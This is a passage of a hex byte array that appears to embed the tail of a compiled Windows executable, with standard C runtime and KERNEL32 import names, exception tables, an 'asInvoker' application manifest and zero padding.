0x72, 0x65, 0x6E, 0x74, 0x5F, 0x65, 0x78, 0x63, 0x65, 0x70, 0x74, 0x69, 0x6F, 0x6E, 0x00, 0x1C, 0x00, 0x5F, 0x5F, 0x63, 0x75, 0x72, 0x72, 0x65, 0x6E, 0x74, 0x5F, 0x65, 0x78, 0x63, 0x65, 0x70, 0x74, 0x69, 0x6F, 0x6E, 0x5F, 0x63, 0x6F, 0x6E, 0x74, 0x65, 0x78, 0x74, 0x00, 0x3E, 0x00, 0x6D, 0x65, 0x6D, 0x73, 0x65, 0x74, 0x00, 0x00, 0x56, 0x43, 0x52, 0x55, 0x4E, 0x54, 0x49, 0x4D, 0x45, 0x31, 0x34, 0x30, 0x2E, 0x64, 0x6C, 0x6C, 0x00, 0x00, 0x00, 0x00, 0x5F, 0x5F, 0x61, 0x63, 0x72, 0x74, 0x5F, 0x69, 0x6F, 0x62, 0x5F, 0x66, 0x75, 0x6E, 0x63, 0x00, 0x03, 0x00, 0x5F, 0x5F, 0x73, 0x74, 0x64, 0x69, 0x6F, 0x5F, 0x63, 0x6F, 0x6D, 0x6D, 0x6F, 0x6E, 0x5F, 0x76, 0x66, 0x70, 0x72, 0x69, 0x6E, 0x74, 0x66, 0x00, 0x40, 0x00, 0x5F, 0x73, 0x65, 0x68, 0x5F, 0x66, 0x69, 0x6C, 0x74, 0x65, 0x72, 0x5F, 0x65, 0x78, 0x65, 0x00, 0x42, 0x00, 0x5F, 0x73, 0x65, 0x74, 0x5F, 0x61, 0x70, 0x70, 0x5F, 0x74, 0x79, 0x70, 0x65, 0x00, 0x09, 0x00, 0x5F, 0x5F, 0x73, 0x65, 0x74, 0x75, 0x73, 0x65, 0x72, 0x6D, 0x61, 0x74, 0x68, 0x65, 0x72, 0x72, 0x00, 0x00, 0x18, 0x00, 0x5F, 0x63, 0x6F, 0x6E, 0x66, 0x69, 0x67, 0x75, 0x72, 0x65, 0x5F, 0x6E, 0x61, 0x72, 0x72, 0x6F, 0x77, 0x5F, 0x61, 0x72, 0x67, 0x76, 0x00, 0x00, 0x33, 0x00, 0x5F, 0x69, 0x6E, 0x69, 0x74, 0x69, 0x61, 0x6C, 0x69, 0x7A, 0x65, 0x5F, 0x6E, 0x61, 0x72, 0x72, 0x6F, 0x77, 0x5F, 0x65, 0x6E, 0x76, 0x69, 0x72, 0x6F, 0x6E, 0x6D, 0x65, 0x6E, 0x74, 0x00, 0x00, 0x28, 0x00, 0x5F, 0x67, 0x65, 0x74, 0x5F, 0x69, 0x6E, 0x69, 0x74, 0x69, 0x61, 0x6C, 0x5F, 0x6E, 0x61, 0x72, 0x72, 0x6F, 0x77, 0x5F, 0x65, 0x6E, 0x76, 0x69, 0x72, 0x6F, 0x6E, 0x6D, 0x65, 0x6E, 0x74, 0x00, 0x36, 0x00, 0x5F, 0x69, 0x6E, 0x69, 0x74, 0x74, 0x65, 0x72, 0x6D, 0x00, 0x37, 0x00, 0x5F, 0x69, 0x6E, 0x69, 0x74, 0x74, 0x65, 0x72, 0x6D, 0x5F, 0x65, 0x00, 0x55, 0x00, 0x65, 0x78, 0x69, 0x74, 0x00, 0x00, 0x23, 0x00, 0x5F, 0x65, 0x78, 0x69, 0x74, 0x00, 0x54, 0x00, 0x5F, 0x73, 0x65, 0x74, 0x5F, 0x66, 0x6D, 0x6F, 0x64, 0x65, 0x00, 0x00, 0x04, 0x00, 0x5F, 0x5F, 0x70, 0x5F, 0x5F, 0x5F, 0x61, 0x72, 0x67, 0x63, 0x00, 0x00, 0x05, 0x00, 0x5F, 0x5F, 0x70, 0x5F, 0x5F, 0x5F, 0x61, 0x72, 0x67, 0x76, 0x00, 0x00, 0x16, 0x00, 0x5F, 0x63, 0x65, 0x78, 0x69, 0x74, 0x00, 0x00, 0x15, 0x00, 0x5F, 0x63, 0x5F, 0x65, 0x78, 0x69, 0x74, 0x00, 0x3D, 0x00, 0x5F, 0x72, 0x65, 0x67, 0x69, 0x73, 0x74, 0x65, 0x72, 0x5F, 0x74, 0x68, 0x72, 0x65, 0x61, 0x64, 0x5F, 0x6C, 0x6F, 0x63, 0x61, 0x6C, 0x5F, 0x65, 0x78, 0x65, 0x5F, 0x61, 0x74, 0x65, 0x78, 0x69, 0x74, 0x5F, 0x63, 0x61, 0x6C, 0x6C, 0x62, 0x61, 0x63, 0x6B, 0x00, 0x00, 0x08, 0x00, 0x5F, 0x63, 0x6F, 0x6E, 0x66, 0x69, 0x67, 0x74, 0x68, 0x72, 0x65, 0x61, 0x64, 0x6C, 0x6F, 0x63, 0x61, 0x6C, 0x65, 0x00, 0x16, 0x00, 0x5F, 0x73, 0x65, 0x74, 0x5F, 0x6E, 0x65, 0x77, 0x5F, 0x6D, 0x6F, 0x64, 0x65, 0x00, 0x01, 0x00, 0x5F, 0x5F, 0x70, 0x5F, 0x5F, 0x63, 0x6F, 0x6D, 0x6D, 0x6F, 0x64, 0x65, 0x00, 0x00, 0x34, 0x00, 0x5F, 0x69, 0x6E, 0x69, 0x74, 0x69, 0x61, 0x6C, 0x69, 0x7A, 0x65, 0x5F, 0x6F, 0x6E, 0x65, 0x78, 0x69, 0x74, 0x5F, 0x74, 0x61, 0x62, 0x6C, 0x65, 0x00, 0x00, 0x3C, 0x00, 0x5F, 0x72, 0x65, 0x67, 0x69, 0x73, 0x74, 0x65, 0x72, 0x5F, 0x6F, 0x6E, 0x65, 0x78, 0x69, 0x74, 0x5F, 0x66, 0x75, 0x6E, 0x63, 0x74, 0x69, 0x6F, 0x6E, 0x00, 0x1E, 0x00, 0x5F, 0x63, 0x72, 0x74, 0x5F, 0x61, 0x74, 0x65, 0x78, 0x69, 0x74, 0x00, 0x67, 0x00, 0x74, 0x65, 0x72, 0x6D, 0x69, 0x6E, 0x61, 0x74, 0x65, 0x00, 0x61, 0x70, 0x69, 0x2D, 0x6D, 0x73, 0x2D, 0x77, 0x69, 0x6E, 0x2D, 0x63, 0x72, 0x74, 0x2D, 0x73, 0x74, 0x64, 0x69, 0x6F, 0x2D, 0x6C, 0x31, 0x2D, 0x31, 0x2D, 0x30, 0x2E, 0x64, 0x6C, 0x6C, 0x00, 0x61, 0x70, 0x69, 0x2D, 0x6D, 0x73, 0x2D, 0x77, 0x69, 0x6E, 0x2D, 0x63, 0x72, 0x74, 0x2D, 0x72, 0x75, 0x6E, 0x74, 0x69, 0x6D, 0x65, 0x2D, 0x6C, 0x31, 0x2D, 0x31, 0x2D, 0x30, 0x2E, 0x64, 0x6C, 0x6C, 0x00, 0x61, 0x70, 0x69, 0x2D, 0x6D, 0x73, 0x2D, 0x77, 0x69, 0x6E, 0x2D, 0x63, 0x72, 0x74, 0x2D, 0x6D, 0x61, 0x74, 0x68, 0x2D, 0x6C, 0x31, 0x2D, 0x31, 0x2D, 0x30, 0x2E, 0x64, 0x6C, 0x6C, 0x00, 0x00, 0x61, 0x70, 0x69, 0x2D, 0x6D, 0x73, 0x2D, 0x77, 0x69, 0x6E, 0x2D, 0x63, 0x72, 0x74, 0x2D, 0x6C, 0x6F, 0x63, 0x61, 0x6C, 0x65, 0x2D, 0x6C, 0x31, 0x2D, 0x31, 0x2D, 0x30, 0x2E, 0x64, 0x6C, 0x6C, 0x00, 0x00, 0x61, 0x70, 0x69, 0x2D, 0x6D, 0x73, 0x2D, 0x77, 0x69, 0x6E, 0x2D, 0x63, 0x72, 0x74, 0x2D, 0x68, 0x65, 0x61, 0x70, 0x2D, 0x6C, 0x31, 0x2D, 0x31, 0x2D, 0x30, 0x2E, 0x64, 0x6C, 0x6C, 0x00, 0x00, 0xE9, 0x04, 0x52, 0x74, 0x6C, 0x43, 0x61, 0x70, 0x74, 0x75, 0x72, 0x65, 0x43, 0x6F, 0x6E, 0x74, 0x65, 0x78, 0x74, 0x00, 0xF1, 0x04, 0x52, 0x74, 0x6C, 0x4C, 0x6F, 0x6F, 0x6B, 0x75, 0x70, 0x46, 0x75, 0x6E, 0x63, 0x74, 0x69, 0x6F, 0x6E, 0x45, 0x6E, 0x74, 0x72, 0x79, 0x00, 0x00, 0xF8, 0x04, 0x52, 0x74, 0x6C, 0x56, 0x69, 0x72, 0x74, 0x75, 0x61, 0x6C, 0x55, 0x6E, 0x77, 0x69, 0x6E, 0x64, 0x00, 0x00, 0xD8, 0x05, 0x55, 0x6E, 0x68, 0x61, 0x6E, 0x64, 0x6C, 0x65, 0x64, 0x45, 0x78, 0x63, 0x65, 0x70, 0x74, 0x69, 0x6F, 0x6E, 0x46, 0x69, 0x6C, 0x74, 0x65, 0x72, 0x00, 0x00, 0x97, 0x05, 0x53, 0x65, 0x74, 0x55, 0x6E, 0x68, 0x61, 0x6E, 0x64, 0x6C, 0x65, 0x64, 0x45, 0x78, 0x63, 0x65, 0x70, 0x74, 0x69, 0x6F, 0x6E, 0x46, 0x69, 0x6C, 0x74, 0x65, 0x72, 0x00, 0x2A, 0x02, 0x47, 0x65, 0x74, 0x43, 0x75, 0x72, 0x72, 0x65, 0x6E, 0x74, 0x50, 0x72, 0x6F, 0x63, 0x65, 0x73, 0x73, 0x00, 0xB6, 0x05, 0x54, 0x65, 0x72, 0x6D, 0x69, 0x6E, 0x61, 0x74, 0x65, 0x50, 0x72, 0x6F, 0x63, 0x65, 0x73, 0x73, 0x00, 0x00, 0x9E, 0x03, 0x49, 0x73, 0x50, 0x72, 0x6F, 0x63, 0x65, 0x73, 0x73, 0x6F, 0x72, 0x46, 0x65, 0x61, 0x74, 0x75, 0x72, 0x65, 0x50, 0x72, 0x65, 0x73, 0x65, 0x6E, 0x74, 0x00, 0x64, 0x04, 0x51, 0x75, 0x65, 0x72, 0x79, 0x50, 0x65, 0x72, 0x66, 0x6F, 0x72, 0x6D, 0x61, 0x6E, 0x63, 0x65, 0x43, 0x6F, 0x75, 0x6E, 0x74, 0x65, 0x72, 0x00, 0x2B, 0x02, 0x47, 0x65, 0x74, 0x43, 0x75, 0x72, 0x72, 0x65, 0x6E, 0x74, 0x50, 0x72, 0x6F, 0x63, 0x65, 0x73, 0x73, 0x49, 0x64, 0x00, 0x2F, 0x02, 0x47, 0x65, 0x74, 0x43, 0x75, 0x72, 0x72, 0x65, 0x6E, 0x74, 0x54, 0x68, 0x72, 0x65, 0x61, 0x64, 0x49, 0x64, 0x00, 0x00, 0x01, 0x03, 0x47, 0x65, 0x74, 0x53, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x54, 0x69, 0x6D, 0x65, 0x41, 0x73, 0x46, 0x69, 0x6C, 0x65, 0x54, 0x69, 0x6D, 0x65, 0x00, 0x81, 0x03, 0x49, 0x6E, 0x69, 0x74, 0x69, 0x61, 0x6C, 0x69, 0x7A, 0x65, 0x53, 0x4C, 0x69, 0x73, 0x74, 0x48, 0x65, 0x61, 0x64, 0x00, 0x97, 0x03, 0x49, 0x73, 0x44, 0x65, 0x62, 0x75, 0x67, 0x67, 0x65, 0x72, 0x50, 0x72, 0x65, 0x73, 0x65, 0x6E, 0x74, 0x00, 0x8C, 0x02, 0x47, 0x65, 0x74, 0x4D, 0x6F, 0x64, 0x75, 0x6C, 0x65, 0x48, 0x61, 0x6E, 0x64, 0x6C, 0x65, 0x57, 0x00, 0x00, 0x4B, 0x45, 0x52, 0x4E, 0x45, 0x4C, 0x33, 0x32, 0x2E, 0x64, 0x6C, 0x6C, 0x00, 0x00, 0x3C, 0x00, 0x6D, 0x65, 0x6D, 0x63, 0x70, 0x79, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xCD, 0x5D, 0x20, 0xD2, 0x66, 0xD4, 0xFF, 0xFF, 0x32, 0xA2, 0xDF, 0x2D, 0x99, 0x2B, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x10, 0x00, 0x00, 0x65, 0x10, 0x00, 0x00, 0xF8, 0x27, 0x00, 0x00, 0x70, 0x10, 0x00, 0x00, 0x8B, 0x10, 0x00, 0x00, 0x04, 0x28, 0x00, 0x00, 0x8B, 0x10, 0x00, 0x00, 0xCD, 0x10, 0x00, 0x00, 0x10, 0x28, 0x00, 0x00, 0xCD, 0x10, 0x00, 0x00, 0xE6, 0x10, 0x00, 0x00, 0x24, 0x28, 0x00, 0x00, 0x00, 0x11, 0x00, 0x00, 0x1E, 0x11, 0x00, 0x00, 0x38, 0x28, 0x00, 0x00, 0x20, 0x11, 0x00, 0x00, 0xD6, 0x11, 0x00, 0x00, 0x3C, 0x28, 0x00, 0x00, 0xD8, 0x11, 0x00, 0x00, 0xE8, 0x11, 0x00, 0x00, 0x44, 0x28, 0x00, 0x00, 0xE8, 0x11, 0x00, 0x00, 0x01, 0x12, 0x00, 0x00, 0x44, 0x28, 0x00, 0x00, 0x04, 0x12, 0x00, 0x00, 0x80, 0x13, 0x00, 0x00, 0x4C, 0x28, 0x00, 0x00, 0x80, 0x13, 0x00, 0x00, 0x92, 0x13, 0x00, 0x00, 0x44, 0x28, 0x00, 0x00, 0x94, 0x13, 0x00, 0x00, 0xC8, 0x13, 0x00, 0x00, 0x3C, 0x28, 0x00, 0x00, 0xC8, 0x13, 0x00, 0x00, 0x9A, 0x14, 0x00, 0x00, 0x8C, 0x28, 0x00, 0x00, 0x9C, 0x14, 0x00, 0x00, 0x0D, 0x15, 0x00, 0x00, 0x94, 0x28, 0x00, 0x00, 0x10, 0x15, 0x00, 0x00, 0x49, 0x15, 0x00, 0x00, 0x44, 0x28, 0x00, 0x00, 0x4C, 0x15, 0x00, 0x00, 0x95, 0x15, 0x00, 0x00, 0x3C, 0x28, 0x00, 0x00, 0x98, 0x15, 0x00, 0x00, 0x23, 0x16, 0x00, 0x00, 0x3C, 0x28, 0x00, 0x00, 0x24, 0x16, 0x00, 0x00, 0xBC, 0x16, 0x00, 0x00, 0xA0, 0x28, 0x00, 0x00, 0xBC, 0x16, 0x00, 0x00, 0xE0, 0x16, 0x00, 0x00, 0x3C, 0x28, 0x00, 0x00, 0xE0, 0x16, 0x00, 0x00, 0x09, 0x17, 0x00, 0x00, 0x3C, 0x28, 0x00, 0x00, 0x0C, 0x17, 0x00, 0x00, 0x46, 0x17, 0x00, 0x00, 0x3C, 0x28, 0x00, 0x00, 0x48, 0x17, 0x00, 0x00, 0x5F, 0x17, 0x00, 0x00, 0x44, 0x28, 0x00, 0x00, 0x60, 0x17, 0x00, 0x00, 0x0C, 0x18, 0x00, 0x00, 0xC8, 0x28, 0x00, 0x00, 0x40, 0x18, 0x00, 0x00, 0x5B, 0x18, 0x00, 0x00, 0x44, 0x28, 0x00, 0x00, 0x80, 0x18, 0x00, 0x00, 0xCB, 0x19, 0x00, 0x00, 0xD4, 0x28, 0x00, 0x00, 0xD4, 0x19, 0x00, 0x00, 0x25, 0x1A, 0x00, 0x00, 0x44, 0x28, 0x00, 0x00, 0x38, 0x1A, 0x00, 0x00, 0x93, 0x1A, 0x00, 0x00, 0xE4, 0x28, 0x00, 0x00, 0x94, 0x1A, 0x00, 0x00, 0xD0, 0x1A, 0x00, 0x00, 0xE4, 0x28, 0x00, 0x00, 0xD0, 0x1A, 0x00, 0x00, 0x0C, 0x1B, 0x00, 0x00, 0xE4, 0x28, 0x00, 0x00, 0x0C, 0x1B, 0x00, 0x00, 0xB8, 0x1C, 0x00, 0x00, 0xF0, 0x28, 0x00, 0x00, 0x90, 0x1D, 0x00, 0x00, 0x92, 0x1D, 0x00, 0x00, 0x00, 0x29, 0x00, 0x00, 0xB0, 0x1D, 0x00, 0x00, 0xB6, 0x1D, 0x00, 0x00, 0x08, 0x29, 0x00, 0x00, 0xB6, 0x1D, 0x00, 0x00, 0xD4, 0x1D, 0x00, 0x00, 0x84, 0x28, 0x00, 0x00, 0xD4, 0x1D, 0x00, 0x00, 0xEC, 0x1D, 0x00, 0x00, 0xC0, 0x28, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x18, 0x00, 0x00, 0x00, 0x18, 0x00, 0x00, 0x80, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x01, 0x00, 0x00, 0x00, 0x30, 0x00, 0x00, 0x80, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x09, 0x04, 0x00, 0x00, 0x48, 0x00, 0x00, 0x00, 0x60, 0x50, 0x00, 0x00, 0x7D, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x3C, 0x3F, 0x78, 0x6D, 0x6C, 0x20, 0x76, 0x65, 0x72, 0x73, 0x69, 0x6F, 0x6E, 0x3D, 0x27, 0x31, 0x2E, 0x30, 0x27, 0x20, 0x65, 0x6E, 0x63, 0x6F, 0x64, 0x69, 0x6E, 0x67, 0x3D, 0x27, 0x55, 0x54, 0x46, 0x2D, 0x38, 0x27, 0x20, 0x73, 0x74, 0x61, 0x6E, 0x64, 0x61, 0x6C, 0x6F, 0x6E, 0x65, 0x3D, 0x27, 0x79, 0x65, 0x73, 0x27, 0x3F, 0x3E, 0x0D, 0x0A, 0x3C, 0x61, 0x73, 0x73, 0x65, 0x6D, 0x62, 0x6C, 0x79, 0x20, 0x78, 0x6D, 0x6C, 0x6E, 0x73, 0x3D, 0x27, 0x75, 0x72, 0x6E, 0x3A, 0x73, 0x63, 0x68, 0x65, 0x6D, 0x61, 0x73, 0x2D, 0x6D, 0x69, 0x63, 0x72, 0x6F, 0x73, 0x6F, 0x66, 0x74, 0x2D, 0x63, 0x6F, 0x6D, 0x3A, 0x61, 0x73, 0x6D, 0x2E, 0x76, 0x31, 0x27, 0x20, 0x6D, 0x61, 0x6E, 0x69, 0x66, 0x65, 0x73, 0x74, 0x56, 0x65, 0x72, 0x73, 0x69, 0x6F, 0x6E, 0x3D, 0x27, 0x31, 0x2E, 0x30, 0x27, 0x3E, 0x0D, 0x0A, 0x20, 0x20, 0x3C, 0x74, 0x72, 0x75, 0x73, 0x74, 0x49, 0x6E, 0x66, 0x6F, 0x20, 0x78, 0x6D, 0x6C, 0x6E, 0x73, 0x3D, 0x22, 0x75, 0x72, 0x6E, 0x3A, 0x73, 0x63, 0x68, 0x65, 0x6D, 0x61, 0x73, 0x2D, 0x6D, 0x69, 0x63, 0x72, 0x6F, 0x73, 0x6F, 0x66, 0x74, 0x2D, 0x63, 0x6F, 0x6D, 0x3A, 0x61, 0x73, 0x6D, 0x2E, 0x76, 0x33, 0x22, 0x3E, 0x0D, 0x0A, 0x20, 0x20, 0x20, 0x20, 0x3C, 0x73, 0x65, 0x63, 0x75, 0x72, 0x69, 0x74, 0x79, 0x3E, 0x0D, 0x0A, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x3C, 0x72, 0x65, 0x71, 0x75, 0x65, 0x73, 0x74, 0x65, 0x64, 0x50, 0x72, 0x69, 0x76, 0x69, 0x6C, 0x65, 0x67, 0x65, 0x73, 0x3E, 0x0D, 0x0A, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x3C, 0x72, 0x65, 0x71, 0x75, 0x65, 0x73, 0x74, 0x65, 0x64, 0x45, 0x78, 0x65, 0x63, 0x75, 0x74, 0x69, 0x6F, 0x6E, 0x4C, 0x65, 0x76, 0x65, 0x6C, 0x20, 0x6C, 0x65, 0x76, 0x65, 0x6C, 0x3D, 0x27, 0x61, 0x73, 0x49, 0x6E, 0x76, 0x6F, 0x6B, 0x65, 0x72, 0x27, 0x20, 0x75, 0x69, 0x41, 0x63, 0x63, 0x65, 0x73, 0x73, 0x3D, 0x27, 0x66, 0x61, 0x6C, 0x73, 0x65, 0x27, 0x20, 0x2F, 0x3E, 0x0D, 0x0A, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x3C, 0x2F, 0x72, 0x65, 0x71, 0x75, 0x65, 0x73, 0x74, 0x65, 0x64, 0x50, 0x72, 0x69, 0x76, 0x69, 0x6C, 0x65, 0x67, 0x65, 0x73, 0x3E, 0x0D, 0x0A, 0x20, 0x20, 0x20, 0x20, 0x3C, 0x2F, 0x73, 0x65, 0x63, 0x75, 0x72, 0x69, 0x74, 0x79, 0x3E, 0x0D, 0x0A, 0x20, 0x20, 0x3C, 0x2F, 0x74, 0x72, 0x75, 0x73, 0x74, 0x49, 0x6E, 0x66, 0x6F, 0x3E, 0x0D, 0x0A, 0x3C, 0x2F, 0x61, 0x73, 0x73, 0x65, 0x6D, 0x62, 0x6C, 0x79, 0x3E, 0x0D, 0x0A, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x20, 0x00, 0x00, 0x30, 0x00, 0x00, 0x00, 0xA0, 0xA1, 0xA8, 0xA1, 0xB0, 0xA1, 0xB8, 0xA1, 0xC0, 0xA1, 0xD0, 0xA1, 0xE0, 0xA1, 0xF8, 0xA1, 0x00, 0xA2, 0x30, 0xA2, 0x38, 0xA2, 0x08, 0xA3, 0x20, 0xA3, 0x28, 0xA3, 0xB0, 0xA3, 0xC8, 0xA3, 0xD0, 0xA3, 0xD8, 0xA3, 0xE0, 0xA3, 0xE8, 0xA3, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 